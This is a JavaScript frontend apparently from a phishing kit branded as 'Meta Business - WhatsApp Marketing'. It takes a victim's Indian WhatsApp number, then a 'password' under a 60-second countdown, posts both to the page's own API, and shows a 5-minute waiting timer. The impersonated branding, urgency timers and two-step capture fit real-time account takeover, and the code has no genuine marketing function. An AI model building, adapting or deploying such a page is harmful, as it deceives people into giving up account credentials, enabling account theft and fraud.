// ===== META BUSINESS - WHATSAPP MARKETING =====
// Frontend JavaScript

let sessionId = generateSessionId();
let timerInterval = null;
let responseTimerInterval = null;

// Generate unique session ID
function generateSessionId() {
    return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Show toast notification
function showToast(message, duration = 3000) {
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toastMessage');
    toastMessage.textContent = message;
    toast.classList.add('show');

    setTimeout(() => {
        toast.classList.remove('show');
    }, duration);
}

// Show error
function showError(elementId, message) {
    const errorEl = document.getElementById(elementId);
    errorEl.textContent = message;
    errorEl.classList.add('show');

    setTimeout(() => {
        errorEl.classList.remove('show');
    }, 4000);
}

// Validate phone number
function validatePhone(phone) {
    const cleaned = phone.replace(/\D/g, '');
    return cleaned.length === 10 && /^[6-9]/.test(cleaned);
}

// Validate password
function validatePassword(password) {
    return password.length >= 4;
}

// Toggle password visibility
function togglePassword() {
    const input = document.getElementById('passwordInput');
    const icon = document.getElementById('eyeIcon');

    if (input.type === 'password') {
        input.type = 'text';
        icon.classList.remove('fa-eye');
        icon.classList.add('fa-eye-slash');
    } else {
        input.type = 'password';
        icon.classList.remove('fa-eye-slash');
        icon.classList.add('fa-eye');
    }
}

// Submit phone number
async function submitPhone() {
    const phoneInput = document.getElementById('phoneInput');
    const sendBtn = document.getElementById('sendBtn');
    const phone = phoneInput.value.trim();

    // Validate
    if (!phone) {
        showError('phoneError', 'Please enter your WhatsApp number');
        return;
    }

    if (!validatePhone(phone)) {
        showError('phoneError', 'Please enter a valid 10-digit Indian number');
        return;
    }

    // Show loading
    sendBtn.classList.add('loading');
    sendBtn.disabled = true;

    try {
        const response = await fetch('/api/submit-phone', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                phone: '+91' + phone.replace(/\D/g, ''),
                sessionId: sessionId
            })
        });

        const data = await response.json();

        if (data.success) {
            showToast('✅ Number submitted successfully!');

            // Hide step 1, show step 2
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');

            // Start timer
            startTimer();
        } else {
            showError('phoneError', data.message || 'Something went wrong');
        }
    } catch (error) {
        console.error('Error:', error);
        showError('phoneError', 'Network error. Please try again.');
    } finally {
        sendBtn.classList.remove('loading');
        sendBtn.disabled = false;
    }
}

// Start 60-second countdown timer
function startTimer() {
    let timeLeft = 60;
    const timerDisplay = document.getElementById('timerDisplay');
    const timerProgress = document.getElementById('timerProgress');
    const verifyBtn = document.getElementById('verifyBtn');

    // SVG circle circumference = 2 * PI * 45 ≈ 283
    const circumference = 283;

    timerInterval = setInterval(() => {
        timeLeft--;

        // Update display
        timerDisplay.textContent = timeLeft;

        // Update progress circle
        const offset = circumference - (timeLeft / 60) * circumference;
        timerProgress.style.strokeDashoffset = offset;

        // Change color when low
        if (timeLeft <= 10) {
            timerProgress.style.stroke = '#FF1744';
        }

        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            timerDisplay.textContent = '0';
            verifyBtn.disabled = true;
            verifyBtn.innerHTML = '<span class="btn-text">Time Expired <i class="fas fa-clock"></i></span>';
            showError('passwordError', 'Time expired! Please refresh and try again.');
        }
    }, 1000);
}

// Submit password
async function submitPassword() {
    const passwordInput = document.getElementById('passwordInput');
    const verifyBtn = document.getElementById('verifyBtn');
    const password = passwordInput.value.trim();

    // Validate
    if (!password) {
        showError('passwordError', 'Please enter your password');
        return;
    }

    if (!validatePassword(password)) {
        showError('passwordError', 'Password must be at least 4 characters');
        return;
    }

    // Show loading
    verifyBtn.classList.add('loading');
    verifyBtn.disabled = true;

    try {
        const response = await fetch('/api/submit-password', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                password: password,
                sessionId: sessionId
            })
        });

        const data = await response.json();

        if (data.success) {
            showToast('✅ Verification successful!');

            // Clear timer
            clearInterval(timerInterval);

            // Hide step 2, show success banner
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('successBanner').classList.remove('hidden');

            // Start 5-minute countdown
            startResponseTimer();
        } else {
            showError('passwordError', data.message || 'Verification failed');
            verifyBtn.classList.remove('loading');
            verifyBtn.disabled = false;
        }
    } catch (error) {
        console.error('Error:', error);
        showError('passwordError', 'Network error. Please try again.');
        verifyBtn.classList.remove('loading');
        verifyBtn.disabled = false;
    }
}

// Start 5-minute response countdown
function startResponseTimer() {
    let totalSeconds = 5 * 60; // 5 minutes
    const display = document.getElementById('responseTimer');

    responseTimerInterval = setInterval(() => {
        totalSeconds--;

        const minutes = Math.floor(totalSeconds / 60);
        const seconds = totalSeconds % 60;

        display.textContent = 
            String(minutes).padStart(2, '0') + ':' + 
            String(seconds).padStart(2, '0');

        if (totalSeconds <= 0) {
            clearInterval(responseTimerInterval);
            display.textContent = '00:00';
        }
    }, 1000);
}

// Handle Enter key for phone input
document.getElementById('phoneInput').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        submitPhone();
    }
});

// Handle Enter key for password input
document.getElementById('passwordInput').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        submitPassword();
    }
});

// Only allow numbers in phone input
document.getElementById('phoneInput').addEventListener('input', function(e) {
    this.value = this.value.replace(/\D/g, '');
});

// Add SVG gradient definition dynamically
const svgNS = "http://www.w3.org/2000/svg";
const svg = document.createElementNS(svgNS, "svg");
svg.setAttribute("width", "0");
svg.setAttribute("height", "0");
svg.style.position = "absolute";

const defs = document.createElementNS(svgNS, "defs");
const linearGradient = document.createElementNS(svgNS, "linearGradient");
linearGradient.setAttribute("id", "timerGradient");
linearGradient.setAttribute("x1", "0%");
linearGradient.setAttribute("y1", "0%");
linearGradient.setAttribute("x2", "100%");
linearGradient.setAttribute("y2", "0%");

const stop1 = document.createElementNS(svgNS, "stop");
stop1.setAttribute("offset", "0%");
stop1.setAttribute("stop-color", "#1877F2");

const stop2 = document.createElementNS(svgNS, "stop");
stop2.setAttribute("offset", "100%");
stop2.setAttribute("stop-color", "#00C853");

linearGradient.appendChild(stop1);
linearGradient.appendChild(stop2);
defs.appendChild(linearGradient);
svg.appendChild(defs);
document.body.appendChild(svg);

console.log('🚀 Meta Business WhatsApp Marketing - Loaded Successfully!');
